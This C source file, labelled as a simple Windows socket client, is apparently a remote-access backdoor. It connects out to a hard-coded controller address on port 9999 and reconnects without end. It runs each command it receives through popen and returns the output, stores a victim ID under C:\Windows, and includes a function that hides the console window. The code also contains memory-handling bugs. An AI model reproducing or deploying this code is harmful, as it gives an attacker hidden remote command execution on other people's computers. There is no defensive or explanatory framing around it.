// Author: Mohammed Ali
// Client side C Socket
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Winsock2.h>
///#pragma comment(lib , "ws2_32.lib")
#pragma comment(lib , "ws2_32.a")


#define PORT 9999
#define Father_IP "8.8.8.8"
#define BUFSIZE 4096
#define TMP_FILE_NAME " > TMP_FOLDER_CONTENT.out"


/// NTree_S implementation for N-ary tree structure.
typedef struct Client_S {
    char * name;           ///< name of the person.
} Client;                         ///< NTree is an alias for the struct.
typedef struct Client_S * Client_P;

void append_to_buffer(char *buffer,char *data){
    int buffer_length = strlen(buffer);
    int data_length = strlen(data);
    int i = 0;
    while (i < data_length){
        buffer[buffer_length+i]= data[i];
        i++;
    }
}

Client_P create_client(){
    Client_P new_client = (Client_P) malloc(sizeof(struct Client_S));
    FILE * fdir = fopen("C:\\Windows\\mux_n.m", "r");
    char *buff = malloc(100);
    memset(buff,0,100);
    char *buff_new = malloc(100);
    memset(buff_new,0,100);
    if (fdir) {
        while (1) {
            if (fgets(buff, 100, fdir) == NULL) break;
            append_to_buffer(buff_new,buff);
        }
    }
    fclose(fdir);
    if (strlen(buff_new) <= 1){
        new_client->name = "0";
    } else {
        new_client->name = buff_new;
    }
    return new_client;
}

int set_client_name(Client_P client,char *new_name){
    free(client->name);
    client->name = new_name;
    FILE * fdir = fopen("C:\\Windows\\mux_n.m", "w");
    fprintf(fdir,"%s",new_name);
    fclose(fdir);
}

int clinet_command(Client_P client,char *command){
    if (command[0] == '*' && command[1] == '*' && command[2] == '*'){
        set_client_name(client,command);
        return 1;
    } else if (command[0] == '?' && command[1] == '?' && command[2] == '?'){
        return 1;
    }
    return 0;
}

char *exec(char* cmd,int cmd_size) {
    FILE* pipe = popen(cmd, "r");
    if (!pipe){
        return "ERROR";
    }
    size_t current_size = 1024;
    char *line_buffer = calloc(current_size, sizeof(char));
    char *result = calloc(current_size, sizeof(char));
    int how_many_line = 0;
    while(!feof(pipe)) {
        how_many_line++;
        if(fgets(line_buffer, current_size, pipe) != NULL)
            strcat(result,line_buffer);
        // reallocate if the buffer is not good/  .
        if (how_many_line >= 10){
            current_size = current_size*2;
            // In case any problem
            if (current_size >= 1650000000){
                current_size = 1650000000;
            }
            how_many_line = 0;
            result = realloc(result,(current_size));
        }
    }
    //for each line
    free(line_buffer);
    //pclose(pipe);
    return result;
}

//char *makeCommand(char *command , int size){
//    int size_file_command = strlen(TMP_FILE_NAME);
//    size_t tmp_num = ((size_t)size * size_file_command) + 1;
//    char *new_comman = malloc(tmp_num);
//    memset(new_comman,0,1024);
//    for (int i = 0; i < size ; ++i) {
//        new_comman[i] = command[i];
//        if (command[i] == '\0'){
//            for (int j = 0; j < size_file_command; j++, i++) {
//                new_comman[i] = TMP_FILE_NAME[j];
//            }
//        }
//    }
//    return new_comman;
//}

char *exception_baby(char* command,int command_size ,char *line,char *everything){
    command[command_size-1] = '\0';
    strcat(command,TMP_FILE_NAME);
    system(command);
    FILE * fdir = fopen("TMP_FOLDER_CONTENT.out", "r");
    while (fgets(line, sizeof(line), fdir)) {
        /* note that fgets don't strip the terminating \n, checking its
           presence would allow to handle lines longer that sizeof(line) */
        strcat(everything,line);
    }
    fclose(fdir);
    //free(buff_tmp1);
    remove(TMP_FILE_NAME);
    return everything;
}

void hide(){
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );  //won't hide the window without SW_MINIMIZE
    ShowWindow( hWnd, SW_HIDE );
}

int send_it(const SOCKET *sClient_p,char *buffer_to_send){
    int ret;
    ret = send(*sClient_p,buffer_to_send , strlen(buffer_to_send), 0);
    //free(buffer_to_send);
    if (ret == 0) {
        //did not send anything
        return 1;
    }
    else if (ret == SOCKET_ERROR) {
        printf("send() failure: %d\n", WSAGetLastError());
        return -1;
    }
    return 0;
}

int setUP(SOCKET *sClient_p){
    WSADATA wsd;
    char Buffer[BUFSIZE];
    int ret,n;
    struct sockaddr_in server;
    unsigned short port;
    struct hostent *host = NULL;
    START_EVERYTHING:
    /*Load Winsock DLL*/
    if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
        printf("Winsock    initialization failed!\n");
        return 0;
    }
    /*Create Socket*/
    *sClient_p = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*sClient_p == INVALID_SOCKET) {
        printf("socket() : %d\n", WSAGetLastError());
        return 0;
    }
    /*Specify the server address*/
    server.sin_family = AF_INET;
    port = PORT;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(Father_IP);
    if (server.sin_addr.s_addr == INADDR_NONE) {
        host = gethostbyname(Father_IP);    /// Enter the address may be a domain name, etc.)
        if (host == NULL) {
            printf("Unable to resolve server address: %s\n", Father_IP);
            return 0;
        }
        CopyMemory(&server.sin_addr,
                   host->h_addr_list[0],
                   host->h_length);
    }
    /* Establish a connection with the server */
    printf("Establishing a connection with the server\n");
    START_CONNECTING:
    if (connect(*sClient_p, (struct sockaddr*)&server,
                sizeof(server)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        if (error == 10061) {
            goto START_CONNECTING;
        } else {
            printf("connect() failure: %d\n", WSAGetLastError());
        }
    }
    return 1;
}

void test1(){
    system("dir >> test12.txt");
}

int main(int argc, char *argv[]) {
    test1();
    //hide();
    //
    Client_P client_pinter = create_client();
    SOCKET sClient;
    int valread;
    char *buffer_to_send;
    char *pointer_to_new_comman;
    char *buffer;
    char *size_of_the_next_buffer;
    int size_of_next_buffer_int;
    size_t size_of_next_buffer_size_t;

    START_EVERYTHING:
    if (setUP(&sClient)){
        printf("Connected! \n");
    } else {
        return 0;
    }
    int first_time = 1;
    /*Send and receive messages*/
    while (1) {
        size_of_the_next_buffer = calloc(1024 , sizeof(char));
        if (first_time){
            if (send_it(&sClient,(char*)client_pinter->name)) break;
            first_time = 0;
        }
        //check the size of the buffer (valread)
        valread = recv(sClient, size_of_the_next_buffer, 1024,0);
        //take the size from the master and allocate memory for it then use it.
        //size_of_next_buffer_int = atoi(size_of_the_next_buffer);
        sscanf(size_of_the_next_buffer, "%i", &size_of_next_buffer_int);
        // allocate buffer.
        buffer = calloc((size_t) (size_of_next_buffer_int +1), sizeof(char));

//        char *buff_tmp1 = (char *) calloc(1024, sizeof(char));
//        char *buff_tmp2 = (char *) calloc(1024, sizeof(char));
        char *buffer_for_the_size = calloc(10, sizeof(char));

        valread = recv(sClient, buffer, size_of_next_buffer_int,0);
        if (valread <= 0){
            printf("problem number %i \n", valread);
            break;
        } else {
            /////////////////////////////////////////////////////////////////////////// Send part
            printf("Recv :%s \n",buffer);
            buffer[size_of_next_buffer_int-1] = '\0';
            if (clinet_command(client_pinter,buffer)){
                // if it is not a cmd command I have to send any to massges so
                // I will send 0 length
                if (send_it(&sClient,"0") == -1 ) break;
                continue;
            }
            //pointer_to_new_comman = makeCommand(buffer,size_of_next_buffer_int);
            //buffer_to_send = exception_baby(buffer,size_of_next_buffer_int,buff_tmp1,buff_tmp2);
            buffer_to_send = exec(buffer,size_of_next_buffer_int);
            int buffer_to_send_length = strlen(buffer_to_send);

            snprintf(buffer_for_the_size, sizeof(buffer_for_the_size), "%d", buffer_to_send_length);
            printf("buffer_for_the_size %s",buffer_for_the_size);
            if (send_it(&sClient,buffer_for_the_size) == -1 ) break;
            // if there is anything can be sent
            if (buffer_to_send_length > 0){
                if (send_it(&sClient,buffer_to_send) ==-1 ) break;
            }
        }
        // Now we dont need buffer anymore
        free(buffer);
//        free(buff_tmp1);
//        free(buff_tmp2);
        free(size_of_the_next_buffer);
        free(buffer_for_the_size);
        free(buffer_to_send);
    }


    //Run out, close the socket handle (file descriptor)
    closesocket(sClient);
    WSACleanup(); //Clean up
    goto START_EVERYTHING;
}
